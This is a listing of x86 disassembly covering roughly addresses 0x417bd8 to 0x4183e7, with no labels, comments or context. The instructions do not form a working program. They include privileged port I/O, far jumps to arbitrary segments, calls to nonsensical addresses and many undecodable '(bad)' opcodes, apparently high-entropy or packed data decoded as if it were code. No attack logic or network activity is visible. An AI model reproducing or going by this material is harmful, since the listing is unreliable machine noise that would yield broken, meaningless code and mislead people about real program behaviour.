  417bd8:	fisub  WORD PTR [eax+0x715794ec]
  417bde:	sbb    edx,DWORD PTR [edi+0x66]
  417be1:	xchg   edx,eax
  417be2:	adc    al,bl
  417be4:	lods   eax,DWORD PTR ds:[esi]
  417be5:	stc    
  417be6:	in     eax,0x89
  417be8:	out    dx,eax
  417be9:	cmp    DWORD PTR [edi+eiz*2-0x42],edi
  417bed:	jge    0x417be9
  417bef:	stos   DWORD PTR es:[edi],eax
  417bf0:	lods   al,BYTE PTR ds:[esi]
  417bf1:	out    0xba,eax
  417bf3:	call   0xf0710170
  417bf8:	sub    BYTE PTR [edx+0x1e1b2918],dl
  417bfe:	or     eax,0x2e1a1fb1
  417c03:	ja     0x417ba4
  417c05:	fdivr  QWORD PTR [ebp-0x74]
  417c08:	pop    ds
  417c09:	sahf   
  417c0a:	cld    
  417c0b:	rcr    BYTE PTR [edx],1
  417c0d:	add    eax,0x772d963b
  417c12:	bound  ecx,QWORD PTR [ebp-0x3ea11668]
  417c18:	or     eax,0xc2d6652a
  417c1d:	push   esi
  417c1e:	dec    ebp
  417c1f:	dec    ecx
  417c20:	adc    eax,0xdc2f7b8d
  417c25:	stos   BYTE PTR es:[edi],al
  417c26:	fadd   QWORD PTR [ebp-0x7ff4babd]
  417c2c:	jno    0x417c97
  417c2e:	fiadd  DWORD PTR [eax]
  417c30:	xchg   ebx,eax
  417c31:	pop    edi
  417c32:	out    0xeb,al
  417c34:	out    dx,al
  417c35:	and    eax,0xeaed3d3c
  417c3a:	dec    esi
  417c3b:	sub    ch,BYTE PTR [ebx]
  417c3d:	jge    0x417be5
  417c3f:	jle    0x417c32
  417c41:	and    dl,bh
  417c43:	inc    esi
  417c44:	loope  0x417c06
  417c46:	(bad)  
  417c47:	test   al,0x38
  417c49:	cmp    dh,BYTE PTR [eax]
  417c4b:	in     eax,0xad
  417c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c4e:	pop    ebp
  417c4f:	ins    BYTE PTR es:[edi],dx
  417c50:	retf   
  417c51:	dec    ecx
  417c52:	xchg   ebp,eax
  417c53:	int3   
  417c54:	sub    BYTE PTR [eax-0x11be85c0],dh
  417c5a:	sub    eax,0x167fd8d9
  417c5f:	call   0x5faac8c2
  417c64:	in     eax,0x7c
  417c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c67:	cdq    
  417c68:	push   ds
  417c69:	neg    BYTE PTR [ebx+0x9]
  417c6c:	pop    esi
  417c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c6e:	int    0x98
  417c70:	inc    esi
  417c71:	rol    BYTE PTR [ebx+0x41ce7be6],cl
  417c77:	xor    DWORD PTR [edi+ecx*1],eax
  417c7a:	inc    esp
  417c7b:	iret   
  417c7c:	fistp  WORD PTR [ebx-0x7d3737a]
  417c82:	scas   eax,DWORD PTR es:[edi]
  417c83:	ror    DWORD PTR [ebx+eiz*1+0x64],1
  417c87:	jp     0x417cb3
  417c89:	adc    edx,ecx
  417c8b:	xchg   esi,eax
  417c8c:	std    
  417c8d:	xchg   esi,eax
  417c8e:	inc    edi
  417c8f:	xchg   ecx,eax
  417c90:	push   0x51
  417c92:	mov    esp,0xfc2a2845
  417c97:	pushf  
  417c98:	lock and ebp,DWORD PTR fs:[edx-0x412cdf18]
  417ca0:	dec    edx
  417ca1:	aam    0xbb
  417ca3:	mov    dl,0xfa
  417ca5:	mov    esp,0xf549ae54
  417caa:	sti    
  417cab:	jmp    0xb1a4:0x4bc22dea
  417cb2:	in     eax,dx
  417cb3:	adc    al,0xb2
  417cb5:	jmp    0xc367:0xe79f09a5
  417cbc:	arpl   WORD PTR [edx+0x3c],sp
  417cbf:	(bad)  
  417cc0:	and    ebp,DWORD PTR [edi+0x46]
  417cc3:	les    esp,FWORD PTR [ecx]
  417cc5:	in     al,dx
  417cc6:	lea    eax,[ecx+eax*8+0x215cc5cf]
  417ccd:	fs xchg DWORD PTR ds:[edx-0x2b],ebp
  417cd2:	test   BYTE PTR [eax],ah
  417cd4:	mov    eax,fs:0x285bf49e
  417cda:	mov    dl,0x11
  417cdc:	inc    edi
  417cdd:	in     eax,dx
  417cde:	jmp    0x640fba61
  417ce3:	or     BYTE PTR [esi+0x44],0x8d
  417ce7:	and    al,0xd4
  417ce9:	mov    esp,0xd4225858
  417cee:	retf   
  417cef:	dec    edi
  417cf0:	xchg   esp,eax
  417cf1:	dec    ebp
  417cf2:	jl     0x417d1d
  417cf4:	dec    eax
  417cf5:	sub    al,0xdc
  417cf7:	jge    0x417cd2
  417cf9:	pop    es
  417cfa:	into   
  417cfb:	mov    ecx,0x37bd5e3d
  417d00:	xor    al,0xd1
  417d02:	pop    es
  417d03:	add    BYTE PTR [edx],al
  417d05:	adc    eax,0x8f8b433a
  417d0a:	and    edi,edx
  417d0c:	pushf  
  417d0d:	dec    ebp
  417d0e:	cli    
  417d0f:	dec    edi
  417d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d11:	repz xor cl,BYTE PTR [esi-0x72a4a41]
  417d18:	or     edi,DWORD PTR [ecx+0x16]
  417d1b:	retf   0xc94f
  417d1e:	sbb    eax,0xd8f88ae0
  417d23:	loopne 0x417da2
  417d25:	dec    ecx
  417d26:	into   
  417d27:	pop    esi
  417d28:	adc    ah,BYTE PTR [ebp+0x59802056]
  417d2e:	ins    DWORD PTR es:[edi],dx
  417d2f:	je     0x417d97
  417d31:	nop
  417d32:	aad    0xeb
  417d34:	outs   dx,BYTE PTR ds:[esi]
  417d35:	retf   
  417d36:	loopne 0x417d2a
  417d38:	mov    eax,ds:0xe87d7440
  417d3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d3e:	ss stc 
  417d40:	icebp  
  417d41:	mov    ch,0x28
  417d43:	test   BYTE PTR [edx+0x522618db],0xf
  417d4a:	inc    edi
  417d4b:	aaa    
  417d4c:	mov    edi,0xe94fe88d
  417d51:	mov    BYTE PTR [esi+eax*4+0x7337b0a],ah
  417d58:	and    al,0x69
  417d5a:	mov    edi,0x8b22f71a
  417d5f:	fwait
  417d60:	scas   eax,DWORD PTR es:[edi]
  417d61:	test   al,0x51
  417d63:	repz mov bl,0x2e
  417d66:	test   DWORD PTR [eax],eax
  417d68:	add    eax,0xd5c52673
  417d6d:	jp     0x417d8f
  417d6f:	sahf   
  417d70:	adc    edx,DWORD PTR [ecx+ecx*1]
  417d73:	pop    ss
  417d74:	test   eax,0x55448ea3
  417d79:	pop    ds
  417d7a:	add    DWORD PTR [eax],eax
  417d7c:	jp     0x417db9
  417d7e:	pop    eax
  417d7f:	popa   
  417d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d81:	pop    edi
  417d82:	and    edi,DWORD PTR [eax]
  417d84:	cmp    eax,DWORD PTR [ecx]
  417d86:	mov    cl,0x50
  417d88:	inc    eax
  417d89:	aam    0xed
  417d8b:	in     eax,0x2a
  417d8d:	xchg   edx,eax
  417d8e:	js     0x417d2d
  417d90:	inc    edx
  417d91:	mov    dl,0xdd
  417d93:	out    0xeb,eax
  417d95:	mov    eax,0xc823956b
  417d9a:	mov    ds:0xab89f20,eax
  417d9f:	mov    ah,0x1f
  417da1:	mov    esp,0x74c45e77
  417da6:	daa    
  417da7:	mov    eax,fs:0xcbc80e00
  417dad:	es (bad) 
  417daf:	jmp    0x3c73:0x16951a1e
  417db6:	pusha  
  417db7:	or     edi,esi
  417db9:	push   esi
  417dba:	mov    ds:0x5349dcdd,al
  417dbf:	adc    al,0x36
  417dc1:	mov    esi,0x584c25b8
  417dc6:	popa   
  417dc7:	out    dx,al
  417dc8:	push   edx
  417dc9:	pushf  
  417dca:	fadd   DWORD PTR [eax]
  417dcc:	hlt    
  417dcd:	jns    0x417e4a
  417dcf:	retf   
  417dd0:	xor    DWORD PTR [edi+edi*2],0x49
  417dd4:	add    DWORD PTR [edi+0x36f5a81],ebp
  417dda:	jmp    0x417d68
  417ddc:	gs leave 
  417dde:	arpl   WORD PTR [esp+ebp*1+0x7eef5603],dx
  417de5:	retf   0xbe5c
  417de8:	jns    0x417e61
  417dea:	sub    esp,DWORD PTR fs:[esi+0x657e646b]
  417df1:	mov    ch,0x39
  417df3:	ret    0x371b
  417df6:	mov    al,ds:0xff46ec1e
  417dfb:	fistp  DWORD PTR [esi+edi*8+0x7a]
  417dff:	mov    ch,0x19
  417e01:	add    DWORD PTR [eax+0x79],edx
  417e04:	push   esi
  417e05:	cmp    ecx,DWORD PTR [edi]
  417e07:	pop    ecx
  417e08:	sub    ah,dh
  417e0a:	cs pusha 
  417e0c:	fild   QWORD PTR [edi-0x485b18]
  417e12:	mov    edx,0xa4ea4e4c
  417e17:	test   DWORD PTR [ebx],ebp
  417e19:	pop    edi
  417e1a:	inc    edi
  417e1b:	test   DWORD PTR [esp+ebx*2-0x2233d14e],ebx
  417e22:	leave  
  417e23:	xchg   DWORD PTR [esi],esp
  417e25:	add    eax,0x29a320be
  417e2a:	push   ebx
  417e2b:	leave  
  417e2c:	arpl   WORD PTR [esi+0x64],dx
  417e2f:	or     edi,DWORD PTR [eax+0x47]
  417e32:	push   ss
  417e33:	daa    
  417e34:	test   DWORD PTR [edi+0x1d],ebx
  417e37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e38:	xor    esp,DWORD PTR [ebp+0x2b]
  417e3b:	mov    eax,DWORD PTR [edx-0xc816cc1]
  417e41:	dec    esi
  417e42:	adc    dh,dh
  417e44:	in     eax,dx
  417e45:	inc    edx
  417e46:	jg     0x417e3f
  417e48:	push   ds
  417e49:	sbb    BYTE PTR [edi-0x33],0x8c
  417e4d:	cs (bad) 
  417e4f:	jb     0x417e8a
  417e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e52:	jns    0x417e30
  417e54:	mov    dl,BYTE PTR [edx+0x6c]
  417e57:	mov    edx,0x52a8ae03
  417e5c:	sub    al,0x27
  417e5e:	jne    0x417dfe
  417e60:	mov    bl,0xa0
  417e62:	push   edi
  417e63:	or     eax,0xb98d6ab6
  417e68:	mov    ds:0x93d0a1c6,al
  417e6d:	cs pusha 
  417e6f:	(bad)  
  417e70:	cmp    dh,BYTE PTR [ecx+eiz*8]
  417e73:	imul   esi,ecx,0xdce1b559
  417e79:	jge    0x417ea6
  417e7b:	nop
  417e7c:	cmc    
  417e7d:	jmp    0xd9b5:0xfc6aeb6f
  417e84:	dec    esi
  417e85:	cmp    al,0xb1
  417e87:	pusha  
  417e88:	imul   esp,ebx,0x2ef6ae44
  417e8e:	sbb    BYTE PTR [esi],al
  417e90:	xchg   ebp,eax
  417e91:	mov    ds,WORD PTR [eax+0x663e85b5]
  417e97:	mov    al,ds:0xf67f66c6
  417e9c:	(bad)
  417ea1:	shl    BYTE PTR [eax],cl
  417ea3:	fisttp QWORD PTR [edx+0x1857149f]
  417ea9:	sahf   
  417eaa:	mov    ch,0xa9
  417eac:	adc    BYTE PTR [ecx+esi*1-0x7234cf73],al
  417eb3:	stos   BYTE PTR es:[edi],al
  417eb4:	adc    ch,BYTE PTR [eax-0x14]
  417eb7:	cmp    eax,0xeb6ba7bf
  417ebc:	jecxz  0x417e87
  417ebe:	jno    0x417efd
  417ec0:	cmp    eax,0x5d2032d8
  417ec5:	add    eax,0xf471b4ad
  417eca:	jb     0x417e59
  417ecc:	inc    eax
  417ecd:	mov    ah,0x78
  417ecf:	xchg   esi,eax
  417ed0:	sub    DWORD PTR [edi-0x7dc7d33f],eax
  417ed6:	add    BYTE PTR [edx],al
  417ed8:	sub    DWORD PTR [eax+ebp*8-0x67],edi
  417edc:	gs mov ebp,0x957dd212
  417ee2:	mov    eax,DWORD PTR [ebp+0x47]
  417ee5:	scas   eax,DWORD PTR es:[edi]
  417ee6:	mov    al,0xb2
  417ee8:	stc    
  417ee9:	adc    dl,bl
  417eeb:	cdq    
  417eec:	mov    eax,0xe6553a02
  417ef1:	pop    es
  417ef2:	pop    edi
  417ef3:	jmp    0xf51536b1
  417ef8:	mov    eax,0x7fda3455
  417efd:	out    dx,eax
  417efe:	push   ebp
  417eff:	and    DWORD PTR [eax],ecx
  417f01:	sub    eax,0x13a72c1c
  417f06:	mov    al,ds:0x8ab67ece
  417f0b:	jle    0x417ea7
  417f0d:	mov    ebp,0x5dc3dda
  417f12:	rol    BYTE PTR [ebp-0x4c03ee10],cl
  417f18:	stos   DWORD PTR es:[edi],eax
  417f19:	call   0x5c4e:0xc42ebad9
  417f20:	dec    DWORD PTR [esi+0x66]
  417f23:	mov    edx,0x6274d1e1
  417f28:	pop    ecx
  417f29:	fwait
  417f2a:	es sbb eax,0x11880383
  417f30:	fld    QWORD PTR [edx+eax*8+0x56]
  417f34:	add    DWORD PTR [edx-0x33a481c8],esi
  417f3a:	shl    BYTE PTR ds:0x3dfb2e02,cl
  417f40:	js     0x417f29
  417f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f43:	int    0x82
  417f45:	inc    ebp
  417f46:	repnz retf 
  417f48:	xchg   ecx,eax
  417f49:	dec    ebp
  417f4a:	and    BYTE PTR [esi-0x4464f738],ch
  417f50:	mov    ebp,0x6ad95131
  417f55:	jne    0x417f86
  417f57:	shl    bh,0x45
  417f5a:	adc    esi,DWORD PTR [ebp-0x33]
  417f5d:	aas    
  417f5e:	mov    eax,0xfc8f368d
  417f63:	mov    al,ds:0x9a5b2d07
  417f68:	push   edi
  417f69:	adc    DWORD PTR [esi],eax
  417f6b:	pop    edi
  417f6c:	popa   
  417f6d:	or     edx,ecx
  417f6f:	outs   dx,WORD PTR ds:[esi]
  417f71:	test   eax,0xe618b040
  417f76:	dec    edi
  417f77:	or     al,0x3e
  417f79:	mov    WORD PTR [eax-0x51c6216d],?
  417f7f:	or     BYTE PTR [edx-0xb876603],0x39
  417f86:	adc    DWORD PTR [edx-0x3fcfd70d],esi
  417f8c:	out    dx,eax
  417f8d:	scas   eax,DWORD PTR es:[edi]
  417f8e:	cmp    bh,BYTE PTR [ebx-0x22]
  417f91:	cmp    DWORD PTR [ebx+0x25],0xffffff93
  417f95:	test   al,0xe5
  417f97:	xchg   DWORD PTR [esi],edx
  417f99:	mov    ds,esp
  417f9b:	out    0x81,eax
  417f9d:	push   edi
  417f9e:	xchg   ecx,eax
  417f9f:	hlt    
  417fa0:	push   ebp
  417fa1:	pop    ss
  417fa2:	jmp    0x417f6e
  417fa4:	or     BYTE PTR [esi],dh
  417fa6:	dec    eax
  417fa7:	adc    al,0x4e
  417fa9:	stos   BYTE PTR es:[edi],al
  417faa:	dec    edx
  417fab:	(bad)  
  417fac:	pop    eax
  417fad:	test   DWORD PTR [ebx-0x5d],edx
  417fb0:	fbstp  TBYTE PTR ds:0xa402ba62
  417fb6:	sub    edx,esp
  417fb8:	adc    DWORD PTR [edi-0x1a],edx
  417fbb:	push   ebx
  417fbc:	cmp    eax,0xa0633ebc
  417fc1:	fbstp  TBYTE PTR [ebp+0x68466074]
  417fc7:	popa   
  417fc8:	jmp    0x8183:0x3cdf7449
  417fcf:	outs   dx,DWORD PTR ds:[esi]
  417fd0:	repnz bound ebx,QWORD PTR [esi]
  417fd3:	push   ss
  417fd4:	mov    ch,0x70
  417fd6:	push   DWORD PTR [ebx+0x10a25752]
  417fdc:	aam    0xdf
  417fde:	repnz cmp dh,BYTE PTR [edx]
  417fe1:	out    dx,al
  417fe2:	out    dx,al
  417fe3:	dec    edx
  417fe4:	dec    esi
  417fe5:	arpl   WORD PTR [ebx+0x1727f6cf],di
  417feb:	gs sbb al,0x85
  417fee:	(bad)  
  417fef:	aad    0x56
  417ff1:	icebp  
  417ff2:	jnp    0x41801e
  417ff4:	and    esi,DWORD PTR [edx]
  417ff6:	jb     0x41801e
  417ff8:	or     esp,esi
  417ffa:	fisub  DWORD PTR [edi-0x4c]
  417ffd:	ror    DWORD PTR [eax+edi*8+0x728e152c],0x31
  418005:	fisub  DWORD PTR [eax]
  418007:	jbe    0x417fba
  418009:	aas    
  41800a:	cmp    BYTE PTR [ebx],cl
  41800c:	or     eax,0x59961c18
  418011:	idiv   dl
  418013:	adc    ebp,DWORD PTR [ecx]
  418015:	mov    ebx,0x755f2825
  41801a:	(bad)  
  41801b:	sub    cl,BYTE PTR [edi-0x57]
  41801e:	pop    edi
  41801f:	mov    cl,0xd8
  418021:	inc    esp
  418022:	or     DWORD PTR [eax+0x13321851],edx
  418028:	ror    BYTE PTR [ecx+0x3],0x2a
  41802c:	and    al,0x93
  41802e:	daa    
  41802f:	nop
  418030:	push   edx
  418031:	fwait
  418032:	in     eax,dx
  418033:	ficomp WORD PTR [edi]
  418035:	add    DWORD PTR [edi+0x69],edi
  418038:	inc    esi
  418039:	(bad)  
  41803a:	cmc    
  41803b:	adc    al,0x94
  41803d:	fisttp WORD PTR [edx+0x201d4688]
  418043:	sub    BYTE PTR [eax-0x249460ab],0xbd
  41804a:	push   0xc17e5174
  41804f:	push   edx
  418050:	jl     0x418017
  418052:	(bad)  
  418053:	leave  
  418054:	ret    0x3e5b
  418057:	push   ebx
  418058:	adc    ebp,ebx
  41805a:	cwde   
  41805b:	adc    al,0xf8
  41805d:	mov    al,0x67
  41805f:	cmp    BYTE PTR gs:[eax+0x3c],bh
  418063:	loop   0x4180d7
  418065:	sub    BYTE PTR [ecx],al
  418067:	and    DWORD PTR [eax],esi
  418069:	push   0x3d
  41806b:	shr    edx,0x97
  41806e:	aaa    
  41806f:	push   edi
  418070:	scas   al,BYTE PTR es:[edi]
  418071:	ja     0x4180bc
  418073:	retf   
  418074:	sub    DWORD PTR [edx],eax
  418076:	jbe    0x418013
  418078:	mov    ds,WORD PTR [eax-0x78]
  41807b:	sbb    BYTE PTR ds:0x193ba15d,ah
  418081:	mov    DWORD PTR [ecx+0x2],eax
  418084:	push   es
  418085:	pushf  
  418086:	div    DWORD PTR [ebp-0x18]
  418089:	mov    ecx,0xff073ef8
  41808e:	dec    esi
  41808f:	xchg   edx,eax
  418090:	jp     0x41802c
  418092:	adc    eax,0x3d0eaeb7
  418097:	sar    cl,cl
  418099:	mov    ch,0x52
  41809c:	out    dx,eax
  41809d:	(bad)  
  41809e:	dec    eax
  41809f:	push   es
  4180a0:	cmp    ebx,DWORD PTR [ecx-0x3f]
  4180a3:	xchg   ecx,eax
  4180a4:	sub    BYTE PTR [esi+0x63],dl
  4180a7:	sub    bh,BYTE PTR [ebp+0x3d]
  4180aa:	cli    
  4180ab:	sub    al,0xa8
  4180ad:	pop    ecx
  4180ae:	(bad)  
  4180af:	adc    ebx,DWORD PTR [edi-0x67]
  4180b2:	mov    eax,0x8cd588c6
  4180b7:	test   al,0xbf
  4180b9:	mov    esp,0xb46b65dd
  4180be:	mov    edx,0x2836b0d7
  4180c3:	aaa    
  4180c4:	dec    ecx
  4180c5:	fucom  st(4)
  4180c7:	repz (bad) 
  4180c9:	ja     0x4180c4
  4180cb:	sub    eax,0x8195748a
  4180d0:	sbb    eax,0x2f7d024e
  4180d5:	repz xchg ecx,eax
  4180d7:	(bad)  
  4180d8:	mov    edx,0x4be0ab78
  4180dd:	loope  0x41808b
  4180df:	mov    ebx,0x6ff3b126
  4180e4:	mov    eax,ds:0x75eebdd9
  4180e9:	iretw  
  4180eb:	mov    eax,0x986e7e0c
  4180f0:	les    edi,FWORD PTR [edi+0x5d2d0592]
  4180f6:	sub    BYTE PTR [ecx-0x7f8a3c13],0x5b
  4180fd:	mov    ch,0xb8
  4180ff:	iret   
  418100:	cmp    BYTE PTR [esi],0xdb
  418103:	push   0x23ac1370
  418108:	inc    edx
  418109:	mov    BYTE PTR [edx+esi*8+0x2f],al
  41810d:	cdq    
  41810e:	nop
  41810f:	fmul   QWORD PTR ss:[edi-0xc648a21]
  418116:	and    dh,BYTE PTR [ecx+0xcbb46ec]
  41811c:	ss je  0x418122
  41811f:	mov    ebx,0x9f1efd6f
  418124:	pop    es
  418125:	xor    edx,DWORD PTR [eax-0x6f631c5d]
  41812b:	jmp    0x4a2f3074
  418130:	aam    0x12
  418132:	mov    esp,0xb15c14a
  418137:	inc    BYTE PTR [edi]
  418139:	addr16 or cl,ah
  41813c:	xor    edx,DWORD PTR [ebx+eiz*8-0x67]
  418140:	xchg   edi,eax
  418141:	retf   0xba2f
  418144:	sar    DWORD PTR [ebx],0x36
  418147:	dec    esi
  418148:	pop    eax
  418149:	xor    al,bh
  41814b:	lahf   
  41814c:	outs   dx,BYTE PTR ds:[esi]
  41814d:	or     al,0x5d
  41814f:	mov    edi,esp
  418151:	inc    edx
  418152:	xor    BYTE PTR [ebp+0x4f9834dc],bl
  418158:	push   ecx
  418159:	popa   
  41815a:	iret   
  41815b:	and    ch,BYTE PTR [ecx-0x451bcd33]
  418161:	daa    
  418162:	and    bl,BYTE PTR [edi+0x4661d950]
  418168:	pop    ecx
  418169:	push   ecx
  41816a:	inc    ecx
  41816b:	imul   ebp,DWORD PTR [ecx-0x54dc121d],0xffffffc6
  418172:	mov    al,0x4a
  418174:	or     edx,DWORD PTR [esi+ebp*4+0x7f7db1a5]
  41817b:	js     0x418112
  41817d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41817e:	nop
  41817f:	lock aas 
  418181:	push   edi
  418182:	call   0xc2457d9b
  418187:	xchg   esp,eax
  418188:	pop    es
  418189:	dec    esp
  41818a:	addr16 mov edi,0x6b824810
  418190:	fs jns 0x41815d
  418193:	and    DWORD PTR ds:0xe07aacc3,ebx
  418199:	xchg   edi,eax
  41819a:	(bad)  
  41819b:	lahf   
  41819c:	push   ss
  41819d:	sbb    edx,ebx
  41819f:	psubsb mm6,QWORD PTR [ebx+edi*8-0x324bfdc1]
  4181a7:	adc    dh,BYTE PTR es:[ebx]
  4181aa:	in     eax,dx
  4181ab:	inc    edx
  4181ac:	push   edx
  4181ad:	pop    ds
  4181ae:	shr    DWORD PTR [ebp-0x11],1
  4181b1:	test   eax,0xc74e0900
  4181b6:	sbb    al,0x41
  4181b8:	dec    ecx
  4181b9:	out    0x3f,al
  4181bb:	mov    esi,0x32db6fc6
  4181c0:	test   eax,0xb9c03a08
  4181c5:	adc    esi,DWORD PTR [esi]
  4181c7:	bound  esp,QWORD PTR ss:[esi]
  4181ca:	dec    ebx
  4181cb:	inc    esi
  4181cc:	sub    al,0x39
  4181ce:	jecxz  0x4181d0
  4181d0:	cld    
  4181d1:	push   es
  4181d2:	adc    al,0x0
  4181d4:	push   es
  4181d5:	dec    esi
  4181d6:	aad    0xc5
  4181d8:	add    ecx,esp
  4181da:	outs   dx,DWORD PTR ds:[esi]
  4181db:	mov    al,ds:0xe67267d1
  4181e0:	mov    cl,0x3e
  4181e2:	sbb    edx,DWORD PTR [ebp-0x4b]
  4181e5:	aam    0x9e
  4181e7:	xor    eax,0xc4c9561c
  4181ec:	sub    BYTE PTR [ebx+0x15a91f44],al
  4181f2:	out    dx,al
  4181f3:	add    ebp,ecx
  4181f5:	(bad)  
  4181f6:	lahf   
  4181f7:	and    eax,0xff296e3e
  4181fc:	cmp    DWORD PTR [edx-0x4fa82c48],edx
  418202:	cli    
  418203:	(bad)  
  418205:	sub    esi,edx
  418207:	jmp    0x692c:0x6d46f4f1
  41820e:	add    ah,BYTE PTR [esi+0x5406c6df]
  418214:	popa   
  418215:	mov    al,ds:0xe66b0c7
  41821a:	jae    0x418276
  41821c:	pop    esp
  41821d:	and    BYTE PTR [esi+edi*4+0x26],ch
  418221:	xchg   edx,eax
  418222:	nop
  418223:	scas   eax,DWORD PTR es:[edi]
  418224:	cwde   
  418225:	or     ch,ah
  418227:	nop
  418228:	mov    edx,0x91ba216a
  41822d:	adc    DWORD PTR [edx-0x2832fb13],edx
  418233:	outs   dx,DWORD PTR ds:[esi]
  418234:	push   0xffffff81
  418236:	and    al,0xf5
  418238:	cwde   
  418239:	add    al,0xe1
  41823b:	jg     0x418281
  41823d:	mov    ecx,0x236ce9ba
  418242:	or     BYTE PTR [edi-0x5807ef72],cl
  418248:	mov    BYTE PTR [ecx+0x1a],dl
  41824b:	iret   
  41824c:	loopne 0x4182ae
  41824e:	and    eax,0x87244b56
  418253:	scas   al,BYTE PTR es:[edi]
  418254:	dec    edi
  418255:	jbe    0x418228
  418257:	pop    esp
  418258:	mov    dl,0x4e
  41825a:	fst    QWORD PTR [edx+edx*4-0x2f]
  41825e:	rcl    esp,0xa7
  418261:	and    al,0xdd
  418263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418264:	push   cs
  418265:	lahf   
  418266:	dec    esi
  418267:	add    DWORD PTR [esi-0x4395018e],ebx
  41826d:	jo     0x4182ce
  41826f:	inc    ecx
  418270:	mov    bh,al
  418272:	add    eax,0x41780c49
  418277:	jae    0x418203
  418279:	jg     0x4182cc
  41827b:	addr16 cs pop ebx
  41827e:	mov    al,BYTE PTR [eax]
  418280:	(bad)  
  418281:	xchg   ebx,eax
  418282:	ror    BYTE PTR [eax],1
  418284:	int    0x1a
  418286:	inc    ebx
  418287:	ins    BYTE PTR es:[edi],dx
  418288:	lea    eax,[edi-0x13a33649]
  41828e:	xchg   DWORD PTR [ecx],esi
  418290:	xor    al,0x4f
  418292:	sbb    al,ah
  418294:	or     esp,DWORD PTR [edi-0x1c4d2d73]
  41829a:	outs   dx,BYTE PTR ds:[esi]
  41829b:	loop   0x4182c5
  41829d:	sbb    edx,ebx
  41829f:	cs and al,bh
  4182a2:	xchg   DWORD PTR [edx+0x46],edi
  4182a5:	xor    DWORD PTR [edx+0x44532e5f],esi
  4182ab:	add    al,BYTE PTR [esi+0x6d]
  4182ae:	mov    edi,0xb6f77d23
  4182b3:	(bad)  
  4182b4:	rcr    DWORD PTR [eax-0x4d4813e4],cl
  4182ba:	jnp    0x418290
  4182bc:	pushw  0xa7bd
  4182c0:	in     eax,0x58
  4182c2:	clc    
  4182c3:	(bad)  
  4182c4:	jle    0x418313
  4182c6:	xor    bl,BYTE PTR ds:0x4d57921
  4182cc:	js     0x418279
  4182ce:	jno    0x41825b
  4182d0:	call   0xbc6:0x5671a086
  4182d7:	mov    edi,0x87eb2e33
  4182dc:	mov    esp,0xb6cd516
  4182e1:	push   ds
  4182e2:	inc    eax
  4182e3:	(bad)  
  4182e4:	jle    0x418281
  4182e6:	mov    BYTE PTR [ecx+0x7283c0a7],0x42
  4182ed:	sub    esp,0x4f
  4182f0:	popf   
  4182f1:	jl     0x4182eb
  4182f3:	push   ecx
  4182f4:	xchg   esp,eax
  4182f5:	ss xchg esp,eax
  4182f7:	fs icebp 
  4182f9:	fld    TBYTE PTR [eax+0x3fa60bf8]
  4182ff:	and    bh,BYTE PTR [esi+eax*4]
  418302:	mov    edi,?
  418304:	pushf  
  418305:	push   ss
  418306:	nop
  418307:	imul   esp,DWORD PTR es:[edi+0x47d0d70],0x38fce49
  418312:	imul   edi,DWORD PTR [edx-0x11],0xa1a9200a
  418319:	mov    BYTE PTR fs:[ebx+0x230ade15],0xd8
  418321:	push   ecx
  418322:	fild   DWORD PTR [edx+0x53]
  418325:	adc    ah,BYTE PTR [ecx+0x38]
  418328:	add    dl,ah
  41832a:	cwde   
  41832b:	data16 aas 
  41832d:	(bad)  
  41832e:	imul   edx,DWORD PTR [edx],0xba1fe45c
  418334:	iret   
  418335:	xchg   ebx,eax
  418336:	dec    ecx
  418337:	mov    bh,0xda
  418339:	cmp    BYTE PTR [edi+0x4882a2ec],ch
  41833f:	ret    0xfaf3
  418342:	xchg   edx,eax
  418343:	or     eax,0xa7898db0
  418348:	sbb    DWORD PTR [esi+0x3f15cc28],esi
  41834e:	mov    dl,0x46
  418350:	xlat   BYTE PTR ds:[ebx]
  418351:	mov    eax,ds:0x7ee6b6f5
  418356:	sbb    esp,DWORD PTR [eax-0x8]
  418359:	inc    ebp
  41835a:	fisubr WORD PTR [esi+0x67]
  41835d:	mov    dh,0xa2
  41835f:	(bad)
  418363:	pop    es
  418364:	cmp    esp,DWORD PTR [eax+0xd8a3244]
  41836a:	pushf  
  41836b:	xchg   edx,eax
  41836c:	cmp    BYTE PTR [ebp*4+0x74d12647],0x57
  418374:	mov    esp,esp
  418376:	cmp    bh,BYTE PTR [ebp-0x42e13226]
  41837c:	xchg   edx,eax
  41837d:	das    
  41837e:	and    BYTE PTR cs:[ecx],bl
  418381:	(bad)  
  418382:	pop    ecx
  418383:	aam    0x3a
  418385:	sub    ebx,eax
  418387:	loopne 0x418334
  418389:	mov    bl,BYTE PTR ds:0xf2b8d307
  41838f:	call   0x3d85:0xab29c7eb
  418396:	push   eax
  418397:	es sub eax,0xf7b66363
  41839d:	mov    esi,0xc9d80290
  4183a2:	jnp    0x418324
  4183a4:	aaa    
  4183a5:	enter  0x4413,0xd9
  4183a9:	pusha  
  4183aa:	mov    ah,BYTE PTR [edx+0x1d]
  4183ad:	cmp    ebx,esi
  4183af:	adc    BYTE PTR [eax-0x410e519],dh
  4183b5:	adc    BYTE PTR [ecx+0x29],dl
  4183b8:	inc    BYTE PTR [esi+eax*4]
  4183bb:	das    
  4183bc:	sbb    eax,0x25418959
  4183c1:	ins    BYTE PTR es:[edi],dx
  4183c2:	mov    ?,eax
  4183c4:	or     esp,edx
  4183c6:	lea    ecx,[eax]
  4183c8:	jmp    0x4183bf
  4183ca:	ins    DWORD PTR es:[edi],dx
  4183cb:	jne    0x41835c
  4183cd:	icebp  
  4183ce:	mov    esi,0xcdb0d04f
  4183d3:	mov    bh,BYTE PTR [edx+edx*8]
  4183d6:	aam    0x3d
  4183d8:	pop    ss
  4183d9:	test   DWORD PTR [eax-0x36e09791],ecx
  4183df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183e0:	shl    DWORD PTR [ecx+0x7145f2e7],1
  4183e6:	aas    
  4183e7:	mov    ebx,0x51d049e
